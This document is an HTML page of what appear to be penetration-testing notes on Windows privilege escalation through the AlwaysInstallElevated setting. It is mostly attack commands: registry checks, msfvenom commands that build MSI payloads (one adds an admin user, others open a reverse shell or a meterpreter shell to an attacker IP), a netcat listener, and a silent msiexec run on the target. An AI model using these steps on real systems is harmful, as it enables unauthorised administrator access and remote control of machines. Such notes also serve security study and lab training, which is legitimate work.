<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>manually</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>manually</h1><br/><br />1. To know if the <span style="text-decoration:underline;">target system is vulnerable</span> we have to check these registry keys:<br />    <div class="codebox"><div class="codebox">C:\&gt;&nbsp;reg&nbsp;query&nbsp;HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer&nbsp;/v&nbsp;AlwaysInstallElevated<br />C:\&gt;&nbsp;reg&nbsp;query&nbsp;HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer&nbsp;/v&nbsp;AlwaysInstallElevated</div></div><br />    <a href=""><img src="images/932-1.png" alt="images/932-1.png" /></a><br />    Both keys are 1, this mean that the target host is vulnerable!<br />2. Now we can generate different types of payloads with msfvenom:<br />   ◇ payload to add an user<br />    <div class="codebox"><div class="codebox">root@kali:/#&nbsp;msfvenom&nbsp;-p&nbsp;windows/adduser&nbsp;USER=admin&nbsp;PASS=password&nbsp;-f&nbsp;msi&nbsp;-o&nbsp;filename.msi</div></div><br />   ◇ create a reverse shell for x63 Windows<br />    <div class="codebox"><div class="codebox">root@kali:/#&nbsp;msfvenom&nbsp;-p&nbsp;windows/x64/shell_reverse_tcp&nbsp;LHOST=192.168.147.139&nbsp;LPORT=53&nbsp;-f&nbsp;msi&nbsp;-o&nbsp;reverse.msi&nbsp;&nbsp;#lhost&nbsp;is&nbsp;the&nbsp;attacker</div></div><br />        <a href=""><img src="images/932-2.png" alt="images/932-2.png" /></a><br />   ◇ create a reverse shell for meterpreter<br />    <div class="codebox"><div class="codebox">root@kali:/#&nbsp;msfvenom&nbsp;-p&nbsp;windows/meterpreter/reverse_https&nbsp;-e&nbsp;x86/shikata_ga_nai&nbsp;LHOST=[LHOST&nbsp;IP]&nbsp;LPORT=443&nbsp;-f&nbsp;msi&nbsp;-o&nbsp;filename.msi</div></div><br /><br />3. Copy the .msi file on the target Windows machine<br />4. Set up a listener on the kali machine(if we have used a reverse shell)<br />    <div class="codebox"><div class="codebox">root@kali:/#&nbsp;nc&nbsp;-nvlp&nbsp;53</div></div><br />5. execute the msi installer specified before on the target system<br />    <div class="codebox"><div class="codebox">C:\&gt;&nbsp;msiexec&nbsp;/quiet&nbsp;/qn&nbsp;/i&nbsp;C:\Users\user\Desktop\reverse.msi</div></div><br />    /quiet → flag that will bypass UAC<br />    /qn → flag that specifies to not use a GUI<br />    /i → flag that is to perform a regular installation of the referenced package<br />    <a href=""><img src="images/932-3.png" alt="images/932-3.png" /></a></div>
</body>
</html>
